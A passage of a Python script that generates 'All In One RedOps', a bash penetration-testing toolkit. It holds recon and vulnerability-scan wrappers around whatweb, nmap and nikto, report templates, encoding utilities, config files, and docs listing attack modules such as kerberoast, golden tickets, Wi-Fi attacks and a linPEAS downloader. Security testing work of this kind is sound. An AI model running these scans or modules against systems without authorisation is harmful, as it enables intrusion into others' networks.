    echo "[+] Web technology detection..."
    if command -v whatweb >/dev/null 2>&1; then
        { whatweb "https://$domain" > "$output_dir/whatweb.txt" || true; } &
    fi
    
    wait
    
    echo "[+] Reconnaissance complete for $domain"
    echo "[*] Results in: $output_dir"
}

airo_vulnscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_vulnscan <target> [--out <file>] [--target <target>] [--nmap-opts \"...\"] [--nikto-opts \"...\"]"
        return 0
    fi
    local out_override=""
    local target_override=""
    local nmap_opts=""
    local nikto_opts=""
    if ! PARSED=$(getopt -o h --long out:,target:,nmap-opts:,nikto-opts:,help -- "$@"); then
        echo "Usage: airo_vulnscan <target> [--out <file>] [--target <target>] [--nmap-opts \"...\"] [--nikto-opts \"...\"]"
        return 1
    fi
    eval set -- "$PARSED"
    while true; do
        case "$1" in
            --out) out_override="$2"; shift 2 ;;
            --target) target_override="$2"; shift 2 ;;
            --nmap-opts) nmap_opts="$2"; shift 2 ;;
            --nikto-opts) nikto_opts="$2"; shift 2 ;;
            -h|--help) echo "Usage: airo_vulnscan <target> [--out <file>] [--target <target>] [--nmap-opts \"...\"] [--nikto-opts \"...\"]"; return 0 ;;
            --) shift; break ;;
            *) break ;;
        esac
    done
    local target="${target_override:-${1:?Usage: vulnscan <target> [--out <file>] [--target <target>] [--nmap-opts \"...\"] [--nikto-opts \"...\"]}}"
    
    echo "[*] Automated vulnerability scan: $target"
    
    if command -v nmap >/dev/null 2>&1; then
        echo "[+] Running Nmap vulnerability scripts..."
        if [[ -n "$nmap_opts" ]]; then
            read -r -a nmap_opts_arr <<< "$nmap_opts"
            run_with_grc nmap "${nmap_opts_arr[@]}" "$target" || true
        else
            run_with_grc nmap -sV --script vuln "$target" || true
        fi
    elif command -v nikto >/dev/null 2>&1; then
        echo "[+] Running Nikto web scanner..."
        if [[ -n "$nikto_opts" ]]; then
            read -r -a nikto_opts_arr <<< "$nikto_opts"
            nikto -h "$target" "${nikto_opts_arr[@]}" || true
        else
            nikto -h "$target" || true
        fi
    else
        echo "[-] No vulnerability scanner found"
    fi
}

airo_reportgen() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        automation_usage "airo_reportgen"
        return 0
    fi
    echo "[*] Generating pentest report template"
    
    local report_dir="$HOME/pentest_reports/$(date +%Y%m%d)"
    mkdir -p "$report_dir"
    
    cat > "$report_dir/report_template.md" << 'REPORT_TEMPLATE'
# Penetration Test Report

## Executive Summary
**Date:** $(date)
**Test Target:** [Target Name/IP]
**Test Duration:** [Duration]
**Overall Risk:** [High/Medium/Low]

### Key Findings
1. [Most Critical Finding]
2. [Second Critical Finding]
3. [Third Critical Finding]

## Technical Details

### 1. Information Gathering
#### 1.1 Target Discovery
- IP Range: [IP Range]
- Domains: [Domains Found]
- Subdomains: [Subdomains]

#### 1.2 Port Scanning
[Port Scan Results]

text

### 2. Vulnerability Assessment
#### 2.1 Critical Vulnerabilities
- [Vulnerability 1]
  - CVSS Score: [Score]
  - Description: [Description]
  - Impact: [Impact]
  - Recommendation: [Recommendation]

### 3. Recommendations
#### 3.1 Immediate Actions (Critical)
1. [Action 1]
2. [Action 2]

### 4. Appendices
#### 4.1 Tools Used
- Nmap
- Metasploit
- Burp Suite
- [Other Tools]

---

*Report generated by All In One RedOps (AIRO)*
REPORT_TEMPLATE
    
    echo "[+] Report template created: $report_dir/report_template.md"
}

airo_findings() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        automation_usage "airo_findings"
        return 0
    fi
    echo "[*] Findings management system"
    
    cat << 'FINDINGS'
Findings Management:

Critical Findings:
  • Remote code execution
  • SQL injection with data extraction
  • Authentication bypass

High Findings:
  • Cross-site scripting (stored)
  • Information disclosure
  • Insecure direct object references

Medium Findings:
  • Cross-site scripting (reflected)
  • CSRF
  • Directory traversal

Tools:
  • Dradis (collaboration)
  • Faraday (IDE)
  • Serpico (reporting)
FINDINGS
}

airo_evidence() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        automation_usage "airo_evidence"
        return 0
    fi
    echo "[*] Evidence collection guidelines"
    
    cat << 'EVIDENCE'
Evidence Collection:

1. Documentation:
   • Screenshots with timestamps
   • Command output with timestamps
   • Network captures

2. Chain of Custody:
   • Who collected it
   • When it was collected
   • Where it was collected from
   • How it was collected

3. Storage:
   • Encrypted storage
   • Backup copies
   • Integrity hashes (MD5, SHA256)
EVIDENCE
}

airo_timertrack() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        automation_usage "airo_timertrack"
        return 0
    fi
    echo "[*] Pentest time tracking"
    
    local cache_dir="${AIRO_CACHE:-$HOME/.airo_cache}"
    mkdir -p "$cache_dir"
    local timer_file="$cache_dir/timer.txt"
    
    if [[ ! -f "$timer_file" ]]; then
        echo "Start time: $(date)" > "$timer_file"
        echo "[+] Timer started at $(date)"
    else
        local start_time="$(head -1 "$timer_file" | cut -d: -f2- || true)"
        echo "[*] Timer started at: $start_time"
        echo "[*] Current time: $(date)"
        
        # Calculate elapsed
        local start_epoch=$(date -d "$start_time" +%s 2>/dev/null || echo 0)
        local now_epoch=$(date +%s)
        local elapsed=$((now_epoch - start_epoch))
        
        local hours=$((elapsed / 3600))
        local minutes=$(((elapsed % 3600) / 60))
        local seconds=$((elapsed % 60))
        
        echo "[+] Elapsed time: ${hours}h ${minutes}m ${seconds}s"
    fi
}

airo_notify() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        automation_usage "airo_notify"
        return 0
    fi
    local message="${1:-Test notification from AIRO}"
    
    echo "[*] Sending notification: $message"
    
    # Simple notification system
    echo "[!] Configure SLACK_WEBHOOK or TELEGRAM_BOT_TOKEN in config"
    echo "[!] Message: $message"
}

export -f airo_reconall airo_vulnscan airo_reportgen airo_findings
export -f airo_evidence airo_timertrack airo_notify
'''
    
    (base_dir / "modules" / "automation.sh").write_text(automation_content, encoding='utf-8')
    (base_dir / "modules" / "automation.sh").chmod(0o755)

def create_module_utilities(base_dir):
    """Create utilities module"""
    utilities_content = '''#!/usr/bin/env bash
set -euo pipefail
# Utilities Module
# 10 utility commands

util_usage() {
    echo "Usage: $1 [--help]"
}

airo_urldecode() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_urldecode <string>"
        return 0
    fi
    local string="${1:?Usage: urldecode <string>}"
    
    echo "[*] URL decoding: $string"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))" "$string" || echo "[-] python3 failed"
    else
        echo "[-] python3 not installed"
    fi
}

airo_urlencode() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_urlencode <string>"
        return 0
    fi
    local string="${1:?Usage: urlencode <string>}"
    
    echo "[*] URL encoding: $string"
    if command -v python3 >/dev/null 2>&1; then
        python3 -c "import sys, urllib.parse as ul; print(ul.quote_plus(sys.argv[1]))" "$string" || echo "[-] python3 failed"
    else
        echo "[-] python3 not installed"
    fi
}

airo_base64d() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_base64d <string>"
        return 0
    fi
    local string="${1:?Usage: base64d <string>}"
    
    echo "[*] Base64 decoding: $string"
    if command -v base64 >/dev/null 2>&1; then
        echo "$string" | base64 -d 2>/dev/null || echo "Invalid base64"
    else
        echo "[-] base64 not installed"
    fi
}

airo_base64e() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_base64e <string>"
        return 0
    fi
    local string="${1:?Usage: base64e <string>}"
    
    echo "[*] Base64 encoding: $string"
    if command -v base64 >/dev/null 2>&1; then
        echo "$string" | base64 || echo "[-] base64 failed"
    else
        echo "[-] base64 not installed"
    fi
}

airo_hexdump() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_hexdump <file>"
        return 0
    fi
    local file="${1:?Usage: hexdump <file>}"
    
    if [[ ! -f "$file" ]]; then
        echo "[-] File not found: $file"
        return 1
    fi
    
    echo "[*] Hex dump of: $file"
    
    if command -v xxd >/dev/null 2>&1; then
        xxd "$file" || true
    elif command -v hexdump >/dev/null 2>&1; then
        hexdump -C "$file" | head -50 || true
    else
        echo "[-] No hex dump tool found"
    fi
}

airo_filetype() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_filetype <file>"
        return 0
    fi
    local file="${1:?Usage: filetype <file>}"
    
    if [[ ! -f "$file" ]]; then
        echo "[-] File not found: $file"
        return 1
    fi
    
    echo "[*] Detecting file type: $file"
    
    if command -v file >/dev/null 2>&1; then
        file "$file"
        
        echo -e "\\nFirst 64 bytes (hex):"
        if command -v xxd >/dev/null 2>&1; then
            head -c 64 "$file" | xxd -p || true
        elif command -v hexdump >/dev/null 2>&1; then
            head -c 64 "$file" | hexdump -C || true
        else
            echo "[-] xxd/hexdump not found"
        fi
        
        echo -e "\\nReadable strings:"
        if command -v strings >/dev/null 2>&1; then
            strings "$file" | head -20 || true
        else
            echo "[-] strings not installed"
        fi
    else
        echo "[-] file command not found"
    fi
}

airo_calccidr() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_calccidr <ip/cidr>"
        return 0
    fi
    local cidr="${1:?Usage: calccidr <ip/cidr>}"
    
    echo "[*] Calculating CIDR: $cidr"
    
    if command -v ipcalc >/dev/null 2>&1; then
        ipcalc "$cidr" || true
    else
        echo "[-] ipcalc not installed"
        echo -e "\\nBasic CIDR ranges:"
        echo "/24 = 256 addresses"
        echo "/16 = 65,536 addresses"
        echo "/8 = 16,777,216 addresses"
    fi
}

airo_shodanscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_shodanscan <query>"
        return 0
    fi
    local query="${1:?Usage: shodanscan <query>}"
    
    echo "[*] Querying Shodan: $query"
    
    if [[ -z "$SHODAN_API_KEY" ]]; then
        echo "[-] SHODAN_API_KEY not set in config"
        echo "[!] Get one from: https://account.shodan.io"
        return 1
    fi
    
    echo "[!] API call would be made with key"
    echo "[!] Query: $query"
}

airo_censysscan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_censysscan <query>"
        return 0
    fi
    local query="${1:?Usage: censysscan <query>}"
    
    echo "[*] Querying Censys: $query"
    
    if [[ -z "$CENSYS_API_ID" ]] || [[ -z "$CENSYS_API_SECRET" ]]; then
        echo "[-] CENSYS_API_ID and CENSYS_API_SECRET not set"
        echo "[!] Get from: https://search.censys.io/account/api"
        return 1
    fi
    
    echo "[!] API call would be made"
    echo "[!] Query: $query"
}

airo_fofascan() {
    if [[ "${1:-}" == "--help" || "${1:-}" == "-h" ]]; then
        echo "Usage: airo_fofascan <query>"
        return 0
    fi
    local query="${1:?Usage: fofascan <query>}"
    
    echo "[*] Searching Fofa: $query"
    
    cat << 'FOFA_SCAN'
Fofa Search Query Examples:

Basic Queries:
  • domain="example.com"
  • ip="192.168.1.1"
  • port="80"

Service Queries:
  • title="Welcome to nginx"
  • banner="Apache"
  • body="login"
FOFA_SCAN
}

export -f airo_urldecode airo_urlencode airo_base64d airo_base64e airo_hexdump
export -f airo_filetype airo_calccidr airo_shodanscan airo_censysscan airo_fofascan
'''
    
    (base_dir / "modules" / "utilities.sh").write_text(utilities_content, encoding='utf-8')
    (base_dir / "modules" / "utilities.sh").chmod(0o755)

def create_config_files(base_dir):
    """Create configuration files"""
    # Main config
    config_content = '''# All In One RedOps (AIRO) Configuration
# Version: 3.2.0

# Scan Settings
SCAN_DELAY=0.5
RATE_LIMIT=100
MAX_HOSTS=254

# Safety Settings
SAFE_MODE=1
AUDIT_LOGGING=1

# Framework Settings
AUTO_LOAD_MODULES=1
TOOL_TIMEOUT=10

# Wordlists (set to your SecLists clone)
WORDLIST_BASE="$HOME/SecLists"
WORDLIST_DIRSCAN="$WORDLIST_BASE/Discovery/Web-Content/common.txt"
WORDLIST_FUZZURL="$WORDLIST_BASE/Discovery/Web-Content/raft-medium-words.txt"

# API Keys (Optional)
# SHODAN_API_KEY="your_key_here"
# CENSYS_API_ID="your_id_here"
# CENSYS_API_SECRET="your_secret_here"
# SLACK_WEBHOOK="your_webhook_here"
# TELEGRAM_BOT_TOKEN="your_token_here"
# TELEGRAM_CHAT_ID="your_chat_id"
'''
    
    (base_dir / "config" / "defaults.conf").write_text(config_content, encoding='utf-8')
    
    ini_content = '''[defaults]
SAFE_MODE=1
AUDIT_LOGGING=1
AUTO_LOAD_MODULES=1

[scanning]
SCAN_DELAY=0.5
RATE_LIMIT=100
MAX_HOSTS=254
TOOL_TIMEOUT=10

[paths]
WORDLIST_BASE=$HOME/SecLists
WORDLIST_DIRSCAN=$HOME/SecLists/Discovery/Web-Content/common.txt
WORDLIST_FUZZURL=$HOME/SecLists/Discovery/Web-Content/raft-medium-words.txt

[network]
PROXY=
TOR=0
USER_AGENT=
JITTER=0

[logging]
JSON_LOGGING=0
DEBUG=0
'''
    
    (base_dir / "config" / "config.ini").write_text(ini_content, encoding='utf-8')
    
# User config template
    user_config = '''# User Configuration Overrides
# Place your custom settings here
# This file overrides defaults.conf

# Example:
# SCAN_DELAY=0.2
# RATE_LIMIT=200
# SAFE_MODE=0
# WORDLIST_BASE="$HOME/SecLists"
# WORDLIST_DIRSCAN="$WORDLIST_BASE/Discovery/Web-Content/raft-medium-directories.txt"
# WORDLIST_FUZZURL="$WORDLIST_BASE/Discovery/Web-Content/raft-medium-words.txt"
'''
    
    (base_dir / "config" / "user.conf.example").write_text(user_config, encoding='utf-8')

def create_documentation(base_dir):
    """Create documentation files"""
    docs_dir = base_dir / "docs"
    docs_dir.mkdir(parents=True, exist_ok=True)

    # README (written to root and docs/ for packaging)
    readme_content = '''# All In One RedOps (AIRO) v3.2.0
## Modular Edition with 150+ Commands

### Overview
All In One RedOps (AIRO) is a comprehensive penetration testing framework with modular architecture. It provides 150+ commands across 12 specialized modules for all phases of penetration testing.

### Features
- **Modular Design**: Load only what you need
- **150+ Commands**: Covering all pentest phases
- **Lazy Loading**: Commands load on demand
- **Configurable**: Easy to customize
- **Safe Mode**: Confirmation for dangerous operations
- **Rate Limiting**: Configurable scan speed
- **XDG Support**: Config at `$XDG_CONFIG_HOME/airo`, data at `$XDG_DATA_HOME/airo`
- **Dry-Run**: `--dry-run` shows what will run without executing
- **Debug/Logs**: `--debug` tracing and errors logged under `$XDG_CACHE_HOME/airo/logs`
- **Proxy/Tor/Jitter**: `--proxy`, `--tor`, `--jitter` for safer routing/pacing
- **JSON Logging**: `--json-log` records command events to `$XDG_CACHE_HOME/airo/logs/commands.jsonl`
- **Wordlists Ready**: Defaults point to SecLists under `$HOME/SecLists`; override via `WORDLIST_DIRSCAN` / `WORDLIST_FUZZURL`
- **PEAS Helper**: `airo getpeas` downloads linPEAS/winPEAS into `$AIRO_HOME/tools/peas`
- **Runtime Flags**: `--fast/--unsafe`, `--delay`, `--rate-limit`, `--safe` to toggle pacing and prompts per run

### Installation
```bash
# 1. Download and extract
unzip airo-redops-v3.2.0.zip
cd airo-redops-v3.2.0

# 2. Run installer
chmod +x install.sh
./install.sh

# 3. Restart terminal or run:
source ~/.bashrc  # or ~/.zshrc

# Optional: set up wordlists (SecLists) and PEAS helpers
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists  # or point WORDLIST_BASE elsewhere
airo getpeas  # download linPEAS/winPEAS into $AIRO_HOME/tools/peas
# Flags (per run): --fast/--unsafe (SAFE_MODE=0, SCAN_DELAY=0, RATE_LIMIT=10000), --safe, --no-delay, --delay=<s>, --rate-limit=<pps>, --dry-run, --verbose, --proxy, --tor, --user-agent/--ua, --jitter, --json-log
'''

    (base_dir / "README.md").write_text(readme_content, encoding='utf-8')
    (docs_dir / "README.md").write_text(readme_content, encoding='utf-8')

    # Extended docs (pulled from local DOCS.md if present, otherwise use embedded full docs)
    docs_source = Path("DOCS.md")
    if docs_source.exists():
        docs_content = docs_source.read_text(encoding='utf-8')
    else:
        docs_content = textwrap.dedent("""\
        # All In One RedOps (AIRO) Splitter – Reference

        Build the AIRO toolkit (v3.2.0) from one Python script. This reference explains what gets generated, how to install/uninstall, how to configure, key commands by module, dependencies, safety, packaging, and troubleshooting.

        ## What the Splitter Generates
        - `airo-core.sh` – core loader (paths, logging, lazy-loading map, aliases, completion).
        - `modules/` – bash modules grouped by domain (network, web, system, privesc, cloud, ad, wireless, mobile, osint, automation, utilities).
        - `config/` – `defaults.conf` (baseline) and `user.conf.example` (override template).
        - `plugins/` – placeholder for extensions.
        - `docs/` – copies of `README.md` and this `DOCS.md`.
        - `install.sh` / `uninstall.sh` – installer and remover (installer can be templated via `install.sh.template`).

        ## Quick Build / Install / Remove
        1) Generate:
        ```bash
        python airo-splitter.py
        ```
        2) Install:
        ```bash
        cd airo-redops-v3.2.0
        sudo ./install.sh
        source ~/.bashrc   # or ~/.zshrc
        ```
        - Installs data to `$XDG_DATA_HOME/airo`, config to `$XDG_CONFIG_HOME/airo`, symlink at `/usr/local/bin/airo`.
        3) Uninstall:
        ```bash
        cd airo-redops-v3.2.0
        ./uninstall.sh
        ```
        - Prompts, removes `$XDG_DATA_HOME/airo` and `$XDG_CONFIG_HOME/airo`, and drops the symlink if it is a symlink.

        ## Using AIRO (basics)
        - Pattern: `airo <command> [args]` (lazy-loads the right module).
        - Discover: `airo help`, `airo modules`, `airo version`.
        - Common: `airo myip`, `airo netscan 192.168.1.0/24`, `airo webscan https://example.com`.
        - Aliases: many commands are available as direct aliases (e.g., `netscan` → `airo netscan`).

        ## Configuration
        - Defaults live in `config/defaults.conf` (copied to `$XDG_CONFIG_HOME/airo/defaults.conf` on install).
        - INI config lives at `$XDG_CONFIG_HOME/airo/config.ini` (optional).
        - User overrides: copy `config/user.conf.example` to `$XDG_CONFIG_HOME/airo/user.conf` and edit.
        - Key knobs: `SAFE_MODE` (prompts for risky actions), `SCAN_DELAY`, `RATE_LIMIT`, `MAX_HOSTS`, `TOOL_TIMEOUT`, `AUTO_LOAD_MODULES`, `AUDIT_LOGGING`.
        - API keys: `SHODAN_API_KEY`, `CENSYS_API_ID`, `CENSYS_API_SECRET`, etc., go in your user config.
        - Wordlists: `WORDLIST_BASE` defaults to `$HOME/SecLists`; set `WORDLIST_DIRSCAN` and `WORDLIST_FUZZURL` to choose lists. Clone SecLists: `git clone https://github.com/danielmiessler/SecLists.git $WORDLIST_BASE`.
        - Flags: per-run toggles `--fast/--unsafe` (SAFE_MODE=0, SCAN_DELAY=0, RATE_LIMIT=10000), `--safe`, `--no-delay`, `--delay=<s>`, `--rate-limit=<pps>`, `--dry-run`, `--verbose`, `--debug`, `--proxy`, `--tor`, `--user-agent/--ua`, `--jitter`, `--json-log`.
        - Command flags:
          - Network: `--ports`, `--top`, `--timeout`, `--output` (portscan/udpscan/netscan).
          - Web: `--wordlist <path|alias>`, `--threads <n>`, `--extensions ext,ext` (dirscan); `--wordlist`, `--threads` (fuzzurl).
          - Automation: `--out <dir/file>`, `--target <value>`, `--nmap-opts "<...>"`, `--nikto-opts "<...>"` (reconall/vulnscan).

        ## Modules Snapshot (high level)
        - **Network**: netscan, portscan, udpscan, alivehosts, dnscan, safescan, lhost/myip, tracer, whoislookup, dnsdump, cidrcalc.
        - **Web**: webscan, dirscan, fuzzurl, sqlcheck, xsscheck, takeover, wpscan, joomscan, sslscan, headerscan, httpxprobe, wayback, katana, nuclei.
        - **System**: sysenum, sudofind, capfind, cronfind, procmon, libfind, serviceenum, userenum.
        - **Privesc**: lpe/wpe, sudoexploit, kernelcheck, winprivesc/linprivesc, getpeas (downloads linPEAS/winPEAS).
        - **Cloud**: awscheck, azcheck, gcpcheck, s3scan, ec2scan, dockerscan, kubescan, containerbreak.
        - **AD**: adusers, adgroups, admachines, bloodhound, kerberoast, asreproast, goldenticket, silverticket, passpol, gpppass.
        - **Wireless**: wifiscan, wifiattack, bluescan, blueattack, wpscrack, handshake, besside, blefind.
        - **Mobile/IoT**: apkanalyze, apkdecompile, ipascan, androidscan, iotscan, firmwareextract, bleenum.
        - **OSINT**: emailosint, userosint, phoneosint, domainosint, breachcheck, leaksearch, metadata, imageosint.
        - **Automation**: reconall, vulnscan, reportgen, findings, evidence, timertrack, notify.
        - **Utilities**: urldecode/urlencode, base64d/base64e, hexdump, filetype, calccidr, shodanscan, censysscan, fofascan.

        ## Dependency Checklist (install what you need)
        - Core/common: bash, coreutils, curl, awk, sed, grep, ip/ifconfig, ping, dig/host.
        - Network: nmap, whois.
        - Web: nikto, gobuster or dirb, ffuf, sqlmap, wpscan, joomscan, sslscan or testssl.sh, httpx, katana, nuclei, gau/waybackurls.
        - System: getcap, watch, ps, ss or netstat.
        - Cloud/Container: awscli, az, gcloud, docker, kubectl.
        - AD: enum4linux, ldapsearch, BloodHound collectors, roasting tools.
        - Wireless: aircrack-ng suite, bluetoothctl; optional bettercap.
        - Mobile/IoT: apktool, jadx, zipalign, adb, gatttool, firmware unpackers.
        - OSINT: exiftool.
        - Automation: subfinder, whatweb, nmap, nikto.
        - Utilities: xxd or hexdump, file, strings; API keys for Shodan/Censys/Fofa.
        - Wordlists: SecLists (`git clone https://github.com/danielmiessler/SecLists.git $HOME/SecLists`) or other packs.
        - Privesc helpers: curl or wget for fetching linPEAS/winPEAS (`airo getpeas` downloads them to `$AIRO_HOME/tools/peas`).
        - Optional: `grc` for colorized nmap output (netscan/portscan/udpscan/safescan use it if present).

        ## Safety and Tuning
        - Keep `SAFE_MODE=1` for prompts; set to `0` only when you accept risk.
        - Throttle with `RATE_LIMIT` and `SCAN_DELAY`; prefer `airo_safescan` on sensitive targets.
        - Use `timeout` for long scans, e.g., `timeout 300 airo vulnscan target`.
        - Redirect output when needed: `airo dnsdump example.com > dns.txt`.

        ## Outputs and Paths
        - Framework data installs to `$XDG_DATA_HOME/airo`; modules live under `$XDG_DATA_HOME/airo/modules`.
        - Config lives under `$XDG_CONFIG_HOME/airo`; cache under `$XDG_CACHE_HOME/airo`.
        - Error logs: `$XDG_CACHE_HOME/airo/logs/airo.log`.
        - JSON logs: `$XDG_CACHE_HOME/airo/logs/commands.jsonl`.
        - `airo_reconall` writes to `~/recon/<domain>-YYYYMMDD/`.
        - `airo_reportgen` writes to `~/pentest_reports/DATE/report_template.md`.

        ## Extending AIRO
        - Add a module: implement `create_module_<name>` in `airo-splitter.py`, export functions, update loader mapping if needed, regenerate.
        - Override installer: drop an `install.sh.template` beside `airo-splitter.py`; the script will use it.
        - Adjust defaults: edit `create_config_files` or change `config/defaults.conf` then regenerate.

        ## Quick Examples
        ```bash
        airo myip
        airo netscan 192.168.1.0/24
        airo webscan https://example.com
        airo reconall example.com
        ```

        ## Troubleshooting
        - Command not found: reinstall and reload shell; ensure `/usr/local/bin/airo` exists and is a symlink.
        - Missing tool: install the dependency for that module (see checklist above).
        - API placeholders: set keys in your user config; cloud scans need their CLIs.
        - Permissions: installer may need sudo for `/usr/local/bin`; uninstaller skips non-symlinks.

        ## Packaging / Distribution Checklist
        - Regenerate and archive: `python airo-splitter.py && tar -czf airo-redops-v3.2.0.tar.gz airo-redops-v3.2.0`.
        - Verify executables: `find airo-redops-v3.2.0 -maxdepth 2 -type f -name "*.sh" -exec test -x {} \\; -print`.
        - Spot-check docs: ensure `README.md` and `DOCS.md` exist in both root and `docs/`.
        - Sanity test installer: run `./install.sh` in a throwaway environment or container if you ship it.
        - Clean secrets: confirm config files only contain placeholders.

        ## Support
        - When reporting, include OS, shell, command, output/error, and dependency status.
        - For extending, mirror patterns in `airo-splitter.py`, regenerate, and test.
        """).lstrip("\n")

    (base_dir / "DOCS.md").write_text(docs_content, encoding='utf-8')
    (docs_dir / "DOCS.md").write_text(docs_content, encoding='utf-8')
    print(f"[+] Docs written to {docs_dir}")

def create_vendor_files(base_dir):
    """Create vendor metadata files (hashes/versions)"""
    vendors_dir = base_dir / "vendors"
    vendors_dir.mkdir(parents=True, exist_ok=True)
    source = Path("vendors/tools.json")
    if source.exists():
        content = source.read_text(encoding='utf-8')
    else:
        content = textwrap.dedent("""\
        {
          "peas": {
            "linpeas": {
              "version": "latest",
              "sha256": ""
            },
            "winpeas": {
              "version": "latest",
              "sha256": ""
            }
          }
        }
        """).lstrip("\n")
    (vendors_dir / "tools.json").write_text(content, encoding='utf-8')

def build_package():
    """Generate the full All In One RedOps (AIRO) package structure and files."""
    base_dir = create_directory_structure()
    create_install_script(base_dir)
    create_uninstall_script(base_dir)
    create_core_loader(base_dir)
    create_module_network(base_dir)
    create_module_web(base_dir)
    create_module_system(base_dir)
    create_module_privesc(base_dir)
    create_module_cloud(base_dir)
    create_module_ad(base_dir)
    create_module_wireless(base_dir)
    create_module_mobile(base_dir)
    create_module_osint(base_dir)
    create_module_automation(base_dir)
    create_module_utilities(base_dir)
    create_config_files(base_dir)
    create_documentation(base_dir)
    create_vendor_files(base_dir)
    print(f"[+] Generated All In One RedOps (AIRO) package at {base_dir.resolve()}")

if __name__ == "__main__":
    build_package()
